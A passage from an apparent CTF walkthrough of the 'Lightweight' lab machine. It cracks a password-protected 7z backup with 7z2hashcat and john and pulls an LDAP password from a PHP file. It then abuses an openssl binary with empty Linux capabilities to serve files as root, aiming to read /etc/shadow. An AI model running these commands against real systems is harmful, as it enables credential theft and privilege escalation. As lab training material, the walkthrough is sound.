+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>lightweight<span style="color:#ff9d00;font-weight:700">/</span>7z2hashcat#&nbsp;.<span style="color:#ff9d00;font-weight:700">/</span>7z2hashcat.pl&nbsp;..<span style="color:#ff9d00;font-weight:700">/</span>backup.7z<br>
+                Cant&nbsp;<span style="color:#ff9d00;font-weight:700">locate</span>&nbsp;Compress<span style="color:#ff9d00;font-weight:700">/</span>Raw<span style="color:#ff9d00;font-weight:700">/</span>Lzma.pm&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;@INC&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>you&nbsp;may&nbsp;need&nbsp;to&nbsp;<span style="color:#ff9d00;font-weight:700">install</span>&nbsp;the&nbsp;Compress<span style="color:#ff9d00;font-weight:700">::</span>Raw<span style="color:#ff9d00;font-weight:700">::</span>Lzma&nbsp;module<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;<br>
+                ...<br>
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>lightweight<span style="color:#ff9d00;font-weight:700">/</span>7z2hashcat#&nbsp;apt&nbsp;<span style="color:#ff9d00;font-weight:700">install</span>&nbsp;libcompress-raw-lzma-perl<br>
+                ...<br>
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>lightweight<span style="color:#ff9d00;font-weight:700">/</span>7z2hashcat#&nbsp;.<span style="color:#ff9d00;font-weight:700">/</span>7z2hashcat.pl&nbsp;..<span style="color:#ff9d00;font-weight:700">/</span>backup.7z<br>
+                <span style="color:#7f0044;font-weight:400">$7z$2$19$0$$8$11e96ba400e3926d0000000000000000$1800843918$3152$3140$1ed4a64a2e9a8bc76c59d8160d3bc3bbfd995ce02cf430ea41949ff4d745f6bf3ed238e9f06e98da3446dda53df0abf11902852e4b2a4e32e0b0f12b33af40d351b2140d6266db1a3d66e1c82fa9d516556ec893ba6841f052618ad210593b9975307b98db7e853e3ebfbef6856039647a6ad33a63f5b268fc003c39eba04484beff73264ff8c8fdb8e3bcc94ee0df4feacbba388536663f8feb8b1454890752fba4a7fba484cfd6d1d050aa6233478a2c425566d60630d985d15dae09c7485f92ea271d2087ac837b6f9101465cf4a62b0ee225245871655b1aa16526a2a5d61ab942d1418900fec9da5771da34cb8bf56ec7f05a75cf26a0202a7065b8b020769d244d95e3166fdb9f4557324e090307e91bc7adc7f56f5215ffd1463c7403c5725cbf006b46882439d629a14d4a1e25fafb202a1cfbac837eabf002f7ebfc87f20c67ff847c393a54e5724c29840016fa76be0dfbb73a79fb2ec3f0e9c7b246525acad50d76c3fe31d75004e5bc3e93ce79aab2ddbc91c7ce9666503e3ab8dcaf269d4554baee5276c516d23fabf41610ff4f666ad5cf9dc6dc3bed7e1c0a2767f018ca3cd15a35a1fbefce479b649a5db00263b55c470fcb049327e7aeb849359a74a2444de7a3c025b3a9dbfd597e0cdf642c340982b650d69f2c48b1e6b823b460734f3c6f3c1e3917b6780b0efda60ce5b7d03d55ff1fa0a161b9aa876b7498c8104f28ca6c6c629d6ca47c18e54bb237b62bd813d1cd47fdcd87b9597ddf14aec439185f8b892dedb4bcae949dbab74d72cd45dda311e0f38f219a1887bede5ec6697a8ab9f5cec687e18fd6ef2223015a3d717830f0aff0664e66ed51d185e965b55ce702135eb57f5efca251238f8e66f828c3d28d961dd09f244e735419273700e5ce97b4fa9ee3d5b45f8b81c9d5af1436e70f75dc9657354807bcadcdcf1e4f9432b29d55c21b59de59c933d0d96b0f3b89f871c14691faa63db3bdde5ca78f2c470839d49690d82f5c8334d9a857af449b1cd4c140b1087f41d09fb46baf5f0e7228716f992635e99861621d0e99d9d649ad863d99adab4ba060ef19b18a3dc2c64815401867c852ea17b01a5c551249cef2a234a1d0a91be047e06678a35ebe7256cca9791590bbfc37ee200d173f1c87a585003920ff52fc38f74da83c18284dbf171eda45fb0cba8d3ed09fc9d9e951ff95ae8b3326ec4d2cf6eaaca2890464a424f79718f044b6b7903c0f512744332f615f81e7a965df81f78ae950b98df910660b4c85bbee5b6b9b4eb061868530d1dee292296ac18e0f3081048834129583b2a7fa88573039ec01657642450688464a2e9db9bf9483d105875a30d855fe6c657a81ce5242a2a99887bdc1c786b57916b03a0d3cdddec1a0a8f94e6d9926ebf534a5b28fc4a4e16956941a5eb8718dbca21d9464a4a970b77a5967483f1373c4dc04967b16164d9d9ef6824acfcb63e20913234712b7abbc82f562aea65ef39d2bef6608d887cd5ff67966967a568a3dc21f28ad393d2ab3ca85ff7b87eebd97f80d878e616121bb94020c6fb80f3780c41dba3b4c4c3fceeba9748f4d9a47d3454b491b95bafddefd04afc8b1922e4a87534539d391fb948b59fcc1f5072c0af3c29afbbec26e2dfd7fc6d4e3a19fdb37cd49342bc7ec7526b6594295b341fe6a1a2a5f399eadade6dcb84d87fd3b00a9b79ef6c11cc01f5958a43fbdd2602eb10b4ddaa327ac043ee01c470d3ed2519488e80183043f41968f32283577cb5615de2416fcb9a74b1ce282614f818bc5adef0cb1dd6eb98d74a8d8214ec2a361b246bad656b487e8dce40f4fef808ad818c06ef5a972e2614e51e6b040f491a92ff39d55408cf92ccc0f797f27d8c1f7c5004b5613a660b6f306ba447bb99bbe5a408d00eb2dd4127351097f204e9d277a5eb97330a3d3409c7e097a18639542b1c9efe35eda1b12c1346bc8816a0430f5668a38735567ba09580504de831bb639ab1de7d2afcf2e470cbded2960f3300aca88446ccf0fa27715666e4eb45fe5d6a7a46c414d61e5fbbfd384c53e8bac6805083164332c2bd79d05c4d10436377a35b8402e186efd8959131437840c7b010d7ce74423e08bea80639414dbd0c290ced5bb1adf597b7a76141cc15d3d3054bcc4e9df234be4187725576645e86e0cfb9b7769a8cdefbec5b08d4feda04e8fd437631e181ac89deec9c54105a32776a2cb8f068177aabc375359e5b38ae4eb8cebf0668f5d104a5c5929c890c7d1de0694063943b844cd8f274b6f6bcbe004b3fe54e52905200e5b024a02498a1f767758e910516c7c295a552802e47d699cdd98adea07bd4f53f745342b990067339b9a0a2ab0c6ea2c0210961b96c7c22b2daaa322de7fddc91527d118c45d4a2a08a2c37a85a7b665ab4ba625b983019085b32096c78ed8a760c83fbf6c5811b7b16681b0a61513686d6810c72d0f1c30b792b1948a478ad660a4036fcd5dbfc57b352a22a4ed27daf1f8455aa9d81a5b8b28287fea4342c14bd42cf3159c830d322d166958a6e233ca7b9dd2914fce1f2621f95998e83df69bee22f70ae086f242690631fcd33730bb2e5ad64fa7d0b7b93931957311eeaa9b45382d020e85856e456712da51a9c220226d2a177e758ea6b7631647cc8419d04fb6b5dab40a841ba9d5660a550ac817af679f3c1a266b9c657372988ab38cfb6971695c59b5454fdf7ca1170066b99c06c985fb8564eed4caade040ef9320d5198041a2bfc62b4b21eb080520628ed3c8c8a2ffd8e0073b24c2059815da86f1b682622e714124950ff26ad79bf31897331fc23cd075fb1f4822046273b0898bebc1ba23110d74ed459c0c0f12488f0b51310f59c9dae537cdda5a75d48a4ac544531fba92fd6dbaa018cb3cc69ee4b9859f3fa1e022d4850bfd995afa9d70273789084f5955a30df3cf7de7f45c2601fe1ee0adbc89dbbd1aa23badcdfcc9d95e2bfd6f102c92bd1fb9648f446a98ab16302049f6862a0da1c758d0f0a7763e9ac0cdda94bed47f98103f8e068cd12bc83bb9a2bd2be19593d64a2f1034cdad6fbee498488a5b37efebcfe667393cf91c1a4d00082ea8463d57e691a0fb3b2394090dab00bb00d27b418b0db0171da74b6d314b78d951ec5ec87eff81800a0f41bb5eb01d5d116183667e1762c4a1d19631c05a61e1be0f05e5188da27df1a0d8697119fbe29693d776ce50c7896a3bc52888ebdcec056a4d7e675af2ea8de25f52e0470e053dd6614b3548ad0cd282a76d397b7e2fedc98d975003bd29feebc53ee5b412088599ac203cb8b6be1f3a0414511391b3495d175b3dfda7990753255ff0f13eb86ce97b5c6925aa31868523c325548720179c69e0e8df8407f5e87f263acd024cc5c4f5a75ef7a6fc1a3b650257fca20aa00674f35a07dac72471bbb500152b51dfe1743b797ad61110aa76b9fe69c0a02506ba4a6fc0b4a202efb9d88dfba38e5b5352046022cc17b57bdb40153db6b97e2f344d2c4598c0d021044eeb01423f6f6ade5702e10b63782fedddbaeba1dd9f9725eb3f85584fce2319b24851d7ec3ba2c2774741683b383ec97aadb7c912d655b6e5b147c33bb1856623b8ca08f092c0677d56e1dde99aa31ab30a654c57828536a120b4e4835ca6c7b5a2243bddfb9a00750521c74654a281cb12c806437030cd577907a797dc63a3959d47b68119a32a229899be06b7979c14b2c98e75667b8c5d30f0dfedd9553ba894ad9acda62f7f607bb35c080c3a440108ac0ce45f1873c5873488f2901790b08cb4928932a1c479d89ded5f6ce9f16c297e9dcc33c6b882b26c53b7a4f2b390367e36e384c1eb9805c0471aad4f77496e8f4fd447448dd59536629a645d04956fc30bcc686718e8d4d7cfc9ecbef3745af038de55826d328b7bad4a2eb7a10faf09c0618fd90d1941e8e3274bcd6eb2d8bed430ebfe6e8682b60390d79161f3a349c73de552d40f7421e5c4b4de80feb3998eb4ce6ecaef9bd2768e8be6534cd12ac163e70d3ed23963801c04770610c91f1ffcf4cbdf2a733f51e6fd596c855c0b905822a3838a82ea2d0e51dd442c451d05c6aa1b0099883db543927c0cc4016e27bb1b17fe863ae0c18458edbccdd6b15f0b73c3dc8c672c1bbbd81f290e9bb5291192143945d58757f64eceebd88e467d48b54a25cee7ed75263a4bb5d5597b9b5b75b6c254f81871f18246d2d91f664a0f49c1f67940d792d225272e713259f3135e5c286e081b1e2331f9217de1c0c9109d7a898458be85a4c130ea6e8c0db4dc5dbf77da5045f7da647c66e5af5676bb15221d5152da551a9390fda92e3539fde7afbd04e2e710ef28b5d5e50f2fdac106c9a18ef02414fb466f50f52b6e88e336ffe4fa929d9548630f3d7fb7d50ea590b2e3bdc3a88cf9d7f6b30f07d28ddf28c15c5371eb$4218$03</span>
+            </div>
+        </div><br>
+        <br>
+        You'll now have a ridiculously large hash.<br>
+        My go-to for cracking hashes is hashcat but for some reason hashcat wouldn't start. Fortunately john worked instead.<br>
+        <br>
+        I copy/pasted the hash above into a file called backup7zhash and cracked it:<br>
+            <div class="codebox">
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>lightweight#&nbsp;john&nbsp;-wordlist=<span style="color:#ff9d00;font-weight:700">/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>share<span style="color:#ff9d00;font-weight:700">/</span>wordlists<span style="color:#ff9d00;font-weight:700">/</span>rockyou.txt&nbsp;backup7zhash<br>
+                Using&nbsp;default&nbsp;input&nbsp;encoding<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;UTF-8<br>
+                Loaded&nbsp;1&nbsp;password&nbsp;<span style="color:#ff9d00;font-weight:700">hash</span>&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>7z,&nbsp;7-Zip&nbsp;[SHA256&nbsp;32<span style="color:#ff9d00;font-weight:700">/</span>32&nbsp;AES]<span style="color:#ff9d00;font-weight:700">)</span><br>
+                Cost&nbsp;1&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>iteration&nbsp;count<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;is&nbsp;524288&nbsp;<span style="color:#ff9d00;font-weight:700">for</span>&nbsp;<span style="color:#7f0044;font-weight:400">all</span>&nbsp;loaded&nbsp;hashes<br>
+                Cost&nbsp;2&nbsp;(padding&nbsp;size)&nbsp;is&nbsp;12&nbsp;for&nbsp;all&nbsp;loaded&nbsp;hashes<br>
+                Cost&nbsp;3&nbsp;(compression&nbsp;type)&nbsp;is&nbsp;2&nbsp;for&nbsp;all&nbsp;loaded&nbsp;hashes<br>
+                Will&nbsp;run&nbsp;2&nbsp;OpenMP&nbsp;threads<br>
+                Press&nbsp;'q'&nbsp;or&nbsp;Ctrl-C&nbsp;to&nbsp;abort,&nbsp;almost&nbsp;any&nbsp;other&nbsp;key&nbsp;for&nbsp;status<br>
+                0g&nbsp;0:00:00:16&nbsp;0.00%&nbsp;(ETA:&nbsp;2019-05-16&nbsp;10:04)&nbsp;0g/s&nbsp;41.37p/s&nbsp;41.37c/s&nbsp;41.37C/s&nbsp;iubire..a123456<br>
+                0g&nbsp;0:00:00:23&nbsp;0.01%&nbsp;(ETA:&nbsp;2019-05-16&nbsp;10:19)&nbsp;0g/s&nbsp;41.26p/s&nbsp;41.26c/s&nbsp;41.26C/s&nbsp;741852..united<br>
+                delete&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(?)<br>
+                1g&nbsp;0:00:00:49&nbsp;DONE&nbsp;(2019-05-11&nbsp;09:45)&nbsp;0.02006g/s&nbsp;41.21p/s&nbsp;41.21c/s&nbsp;41.21C/s&nbsp;rey619..delete<br>
+                Use&nbsp;the&nbsp;"--show"&nbsp;option&nbsp;to&nbsp;display&nbsp;all&nbsp;of&nbsp;the&nbsp;cracked&nbsp;passwords&nbsp;reliably<br>
+                Session&nbsp;completed<br>
+                root@kali:~/ctf/lightweight#&nbsp;7za&nbsp;e&nbsp;backup.7z&nbsp;<br>
+                <br>
+                7-Zip&nbsp;(a)&nbsp;[32]&nbsp;16.02&nbsp;:&nbsp;Copyright&nbsp;(c)&nbsp;1999-2016&nbsp;Igor&nbsp;Pavlov&nbsp;:&nbsp;2016-05-21<br>
+                p7zip&nbsp;Version&nbsp;16.02&nbsp;(locale=en_GB.UTF-8,Utf16=on,HugeFiles=on,32&nbsp;bits,2&nbsp;CPUs&nbsp;Intel(R)&nbsp;Core(TM)&nbsp;i5-7500&nbsp;CPU&nbsp;@&nbsp;3.40GHz&nbsp;(906E9),ASM,AES-NI)<br>
+                <br>
+                Scanning&nbsp;the&nbsp;drive&nbsp;for&nbsp;archives:<br>
+                1&nbsp;file,&nbsp;3411&nbsp;bytes&nbsp;(4&nbsp;KiB)<br>
+                <br>
+                Extracting&nbsp;archive:&nbsp;backup.7z<br>
+                --<br>
+                Path&nbsp;=&nbsp;backup.7z<br>
+                Type&nbsp;=&nbsp;7z<br>
+                Physical&nbsp;Size&nbsp;=&nbsp;3411<br>
+                Headers&nbsp;Size&nbsp;=&nbsp;259<br>
+                Method&nbsp;=&nbsp;LZMA2:12k&nbsp;7zAES<br>
+                Solid&nbsp;=&nbsp;+<br>
+                Blocks&nbsp;=&nbsp;1<br>
+                <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;<br>
+                Enter&nbsp;password&nbsp;(will&nbsp;not&nbsp;be&nbsp;echoed):&nbsp;delete<br>
+                Everything&nbsp;is&nbsp;Ok<br>
+                <br>
+                Files:&nbsp;5<br>
+                Size:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;10270<br>
+                Compressed:&nbsp;3411
+            </div>
+        </div><br>
+        <br>
+        The interesting file you want is status.php:<br>
+            <div class="codebox">
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>lightweight#&nbsp;<span style="color:#ff9d00;font-weight:700">cat</span>&nbsp;status.php<br>
+                ...<br>
+                <span style="color:#7f0044;font-weight:400">$username</span>&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">'ldapuser1'</span><span style="color:#ff9d00;font-weight:700">;</span><br>
+                <span style="color:#7f0044;font-weight:400">$password</span>&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">'f3ca9d298a553da117442deeb6fa932d'</span><span style="color:#ff9d00;font-weight:700">;</span><br>
+                ...
+            </div>
+        </div><br>
+        <br>
+        <a id="h2-6" name="h2-6"></a><strong></strong>
+        <h2><strong>6) ldapuser1</strong></h2><br>
+            <div class="codebox">
+                [ldapuser2@lightweight&nbsp;~]$&nbsp;<span style="color:#ff9d00;font-weight:700">su</span>&nbsp;ldapuser1<br>
+                Password<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;f3ca9d298a553da117442deeb6fa932d<br>
+                [ldapuser1@lightweight&nbsp;ldapuser2]$&nbsp;<span style="color:#ff9d00;font-weight:700">cd</span>&nbsp;~<br>
+                [ldapuser1@lightweight&nbsp;~]$&nbsp;<span style="color:#ff9d00;font-weight:700">ls</span>&nbsp;-alh<br>
+                total&nbsp;1.5M<br>
+                drwx------.&nbsp;&nbsp;4&nbsp;ldapuser1&nbsp;ldapuser1&nbsp;&nbsp;181&nbsp;Jun&nbsp;15&nbsp;&nbsp;2018&nbsp;.<br>
+                drwxr-xr<span style="color:#ffdd00;font-weight:400">-x</span>.&nbsp;18&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;4.0K&nbsp;May&nbsp;11&nbsp;10<span style="color:#ff9d00;font-weight:700">:</span>27&nbsp;..<br>
+                -rw-------.&nbsp;&nbsp;1&nbsp;ldapuser1&nbsp;ldapuser1&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;Jun&nbsp;21&nbsp;&nbsp;2018&nbsp;.bash_history<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--.&nbsp;&nbsp;1&nbsp;ldapuser1&nbsp;ldapuser1&nbsp;&nbsp;&nbsp;18&nbsp;Apr&nbsp;11&nbsp;&nbsp;2018&nbsp;.bash_logout<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--.&nbsp;&nbsp;1&nbsp;ldapuser1&nbsp;ldapuser1&nbsp;&nbsp;193&nbsp;Apr&nbsp;11&nbsp;&nbsp;2018&nbsp;.bash_profile<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--.&nbsp;&nbsp;1&nbsp;ldapuser1&nbsp;ldapuser1&nbsp;&nbsp;246&nbsp;Jun&nbsp;15&nbsp;&nbsp;2018&nbsp;.bashrc<br>
+                drwxrwxr<span style="color:#ffdd00;font-weight:400">-x</span>.&nbsp;&nbsp;3&nbsp;ldapuser1&nbsp;ldapuser1&nbsp;&nbsp;&nbsp;18&nbsp;Jun&nbsp;11&nbsp;&nbsp;2018&nbsp;.cache<br>
+                -rw-rw<span style="color:#ffdd00;font-weight:400">-r</span>--.&nbsp;&nbsp;1&nbsp;ldapuser1&nbsp;ldapuser1&nbsp;9.5K&nbsp;Jun&nbsp;15&nbsp;&nbsp;2018&nbsp;capture.pcap<br>
+                drwxrwxr<span style="color:#ffdd00;font-weight:400">-x</span>.&nbsp;&nbsp;3&nbsp;ldapuser1&nbsp;ldapuser1&nbsp;&nbsp;&nbsp;18&nbsp;Jun&nbsp;11&nbsp;&nbsp;2018&nbsp;.config<br>
+                -rw-rw<span style="color:#ffdd00;font-weight:400">-r</span>--.&nbsp;&nbsp;1&nbsp;ldapuser1&nbsp;ldapuser1&nbsp;&nbsp;646&nbsp;Jun&nbsp;15&nbsp;&nbsp;2018&nbsp;ldapTLS.php<br>
+                -rwxr-xr<span style="color:#ffdd00;font-weight:400">-x</span>.&nbsp;&nbsp;1&nbsp;ldapuser1&nbsp;ldapuser1&nbsp;543K&nbsp;Jun&nbsp;13&nbsp;&nbsp;2018&nbsp;openssl<br>
+                -rwxr-xr<span style="color:#ffdd00;font-weight:400">-x</span>.&nbsp;&nbsp;1&nbsp;ldapuser1&nbsp;ldapuser1&nbsp;921K&nbsp;Jun&nbsp;13&nbsp;&nbsp;2018&nbsp;tcpdump<br>
+                [ldapuser1@lightweight&nbsp;~]$&nbsp;
+            </div>
+        </div><br>
+        <br>
+        capture.pcap meant nothing to me, I've got no idea whether it has a purpose or is a rabbit hole.<br>
+        There are 2 binaries to take note of, openssl and tcpdump.<br>
+        <br>
+        The privesc method is a variation on SUID binaries.<br>
+        SUID binaries allow a user to execute an entire command as root.<br>
+        An alternative to SUID binaries, intended to be more secure than SUID, are Linux capabilities.<br>
+        <br>
+        Capabilities are permissions set on a binary that allow it make specific system calls to the kernel e.g. you allow Apache to create raw network sockets with root permissions (using the capabilities CAP_NET_BIND_SERVICE and CAP_NET_RAW) because it needs to open a privileged port (port 80), which only root can normally do.<br>
+        <br>
+        This is a more secure approach than using a SUID binary.<br>
+        <br>
+        However, if you have a binary that:<br>
+        1. is not owned by root<br>
+        2. has no <code>SUID</code>/<code>SGID</code> bits set<br>
+        3. has empty capabilities set (e.g.: ping=ep)<br>
+        <br>
+        then that binary will run as root. This is the case on this box.<br>
+        <br>
+        Scan the file system for files with capabilities:<br>
+            <div class="codebox">
+                [ldapuser1@lightweight&nbsp;~]$&nbsp;getcap&nbsp;-r&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>&nbsp;2&gt;<span style="color:#ff9d00;font-weight:700">/</span>dev<span style="color:#ff9d00;font-weight:700">/</span>null<br>
+                <span style="color:#ff9d00;font-weight:700">/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/ping</span>&nbsp;=&nbsp;cap_net_admin,cap_net_raw+p<br>
+                <span style="color:#ff9d00;font-weight:700">/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>sbin<span style="color:#ff9d00;font-weight:700">/</span>mtr&nbsp;=&nbsp;cap_net_raw+ep<br>
+                <span style="color:#ff9d00;font-weight:700">/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>sbin<span style="color:#ff9d00;font-weight:700">/</span>suexec&nbsp;=&nbsp;cap_setgid,cap_setuid+ep<br>
+                <span style="color:#ff9d00;font-weight:700">/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>sbin<span style="color:#ff9d00;font-weight:700">/</span>arping&nbsp;=&nbsp;cap_net_raw+p<br>
+                <span style="color:#ff9d00;font-weight:700">/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>sbin<span style="color:#ff9d00;font-weight:700">/</span>clockdiff&nbsp;=&nbsp;cap_net_raw+p<br>
+                <span style="color:#ff9d00;font-weight:700">/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>sbin<span style="color:#ff9d00;font-weight:700">/</span>tcpdump&nbsp;=&nbsp;cap_net_admin,cap_net_raw+ep<br>
+                <span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>ldapuser1<span style="color:#ff9d00;font-weight:700">/</span>tcpdump&nbsp;=&nbsp;cap_net_admin,cap_net_raw+ep<br>
+                <span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>ldapuser1<span style="color:#ff9d00;font-weight:700">/</span>openssl&nbsp;=ep
+            </div>
+        </div><br>
+        <br>
+        The openssl binary in ldapuser1's home directory has empty capabilities, meaning it will run as root.<br>
+        openssl as a command can also download and upload files. Since we can download/upload as root, we're going to modify /etc/shadow.<br>
+        <br>
+        <a id="h3-1" name="h3-1"></a><strong></strong>
+        <h3><strong>6a) openssl</strong></h3><br>
+        First, we change directory to the root filesystem because openssl's HTTP server interprets GET requests relative to the current directory.<br>
+        i.e. if you're in /home/ldapuser1 when you start the server and request https://localhost:1337/etc/shadow it wouldn't work because it would request /home/ldapuser1/etc/shadow. So, you create the openssl server whilst at the root of the filesystem, using '..' in the path to access other directories doesn't work.<br>
+        <br>
+        Create a temporary directory where you can dump the ssl key and certificate, and create them.<br>
+            <div class="codebox">
+                [ldapuser1@lightweight&nbsp;~]$&nbsp;<span style="color:#ff9d00;font-weight:700">mkdir</span>&nbsp;openssltmp<br>
+                [ldapuser1@lightweight&nbsp;~]$&nbsp;<span style="color:#ff9d00;font-weight:700">cd</span>&nbsp;openssltmp<span style="color:#ff9d00;font-weight:700">/</span><br>
+                [ldapuser1@lightweight&nbsp;openssltmp]$&nbsp;<span style="color:#ff9d00;font-weight:700">ls</span><br>
+                [ldapuser1@lightweight&nbsp;openssltmp]$&nbsp;openssl&nbsp;req&nbsp;-x509&nbsp;-newkey&nbsp;rsa<span style="color:#ff9d00;font-weight:700">:</span>4096&nbsp;-keyout&nbsp;key.pem&nbsp;-out&nbsp;cert.pem&nbsp;-days&nbsp;365&nbsp;-nodes<br>
+                Generating&nbsp;a&nbsp;4096&nbsp;bit&nbsp;RSA&nbsp;private&nbsp;key<br>
+                ....................................................++<br>
+                ...................................................................................................................................................................................................................................................................++<br>
+                writing&nbsp;new&nbsp;private&nbsp;key&nbsp;to&nbsp;<span style="color:#3ad900;font-weight:400">'key.pem'</span><br>
+                -----<br>
+                You&nbsp;are&nbsp;about&nbsp;to&nbsp;be&nbsp;asked&nbsp;to&nbsp;enter&nbsp;information&nbsp;that&nbsp;will&nbsp;be&nbsp;incorporated<br>
+                into&nbsp;your&nbsp;certificate&nbsp;request.<br>
+                What&nbsp;you&nbsp;are&nbsp;about&nbsp;to&nbsp;enter&nbsp;is&nbsp;what&nbsp;is&nbsp;called&nbsp;a&nbsp;Distinguished&nbsp;Name&nbsp;or&nbsp;a&nbsp;DN.<br>
+                There&nbsp;are&nbsp;quite&nbsp;a&nbsp;few&nbsp;fields&nbsp;but&nbsp;you&nbsp;can&nbsp;leave&nbsp;some&nbsp;blank<br>
+                For&nbsp;some&nbsp;fields&nbsp;there&nbsp;will&nbsp;be&nbsp;a&nbsp;default&nbsp;value,<br>
+                If&nbsp;you&nbsp;enter&nbsp;<span style="color:#3ad900;font-weight:400">'.'</span>,&nbsp;the&nbsp;field&nbsp;will&nbsp;be&nbsp;left&nbsp;blank.<br>
+                -----<br>
+                Country&nbsp;Name&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>2&nbsp;letter&nbsp;code<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;[XX]<span style="color:#ff9d00;font-weight:700">:</span><br>
+                State&nbsp;or&nbsp;Province&nbsp;Name&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>full&nbsp;name<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;[]<span style="color:#ff9d00;font-weight:700">:</span><br>
+                Locality&nbsp;Name&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>eg,&nbsp;city<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;[Default&nbsp;City]<span style="color:#ff9d00;font-weight:700">:</span><br>
+                Organization&nbsp;Name&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>eg,&nbsp;company<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;[Default&nbsp;Company&nbsp;Ltd]<span style="color:#ff9d00;font-weight:700">:</span><br>
+                Organizational&nbsp;Unit&nbsp;Name&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>eg,&nbsp;section<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;[]<span style="color:#ff9d00;font-weight:700">:</span><br>
+                Common&nbsp;Name&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>eg,&nbsp;your&nbsp;name&nbsp;or&nbsp;your&nbsp;servers&nbsp;<span style="color:#ff9d00;font-weight:700">hostname)</span>&nbsp;[]<span style="color:#ff9d00;font-weight:700">:</span><br>
+                Email&nbsp;Address&nbsp;[]<span style="color:#ff9d00;font-weight:700">:</span><br>
+                [ldapuser1@lightweight&nbsp;openssltmp]$&nbsp;<span style="color:#ff9d00;font-weight:700">ls</span><br>
+                cert.pem&nbsp;&nbsp;key.pem
+            </div>
+        </div><br>
+        <br>
+        Next, you have to cd to the root of the filesystem.<br>
+        <br>
+        You're going to create an openssl server, and the openssl server will run relative to its current directory. i.e. if you run openssl in /home/ldapuser1 retrieving https://localhost:9001/etc/shadow won't work because it will try to retrieve /home/ldapuser/etc/shadow - which doesn't exist. So run openssl from the root of the file system (using ‘..’ to visit parent directories doesn't work).<br>
+        <br>
+        Create the openssl server using the keys you created before:<br>
+            <div class="codebox">
+                [ldapuser1@lightweight&nbsp;openssltmp]$&nbsp;<span style="color:#ff9d00;font-weight:700">cd</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span><br>
+                [ldapuser1@lightweight&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>]$&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>ldapuser1<span style="color:#ff9d00;font-weight:700">/</span>openssl&nbsp;s_server&nbsp;-key&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>ldapuser1<span style="color:#ff9d00;font-weight:700">/</span>openssltmp<span style="color:#ff9d00;font-weight:700">/</span>key.pem&nbsp;-cert&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>ldapuser1<span style="color:#ff9d00;font-weight:700">/</span>openssltmp<span style="color:#ff9d00;font-weight:700">/</span>cert.pem&nbsp;-port&nbsp;9001&nbsp;-HTTP<br>
+                Using&nbsp;default&nbsp;temp&nbsp;DH&nbsp;parameters<br>
+                ACCEPT
+            </div>
+        </div><br>
+        <br>
+        At this point you can read any file on the system using curl.<br>
+        Log in to another shell on the target and curl for /etc/shadow:<br>
+            <div class="codebox">
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>lightweight#&nbsp;<span style="color:#ff9d00;font-weight:700">ssh</span>&nbsp;10.10.13.128@10.10.10.119<br>
+                10.10.13.128@10.10.10.119s&nbsp;password<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;<br>
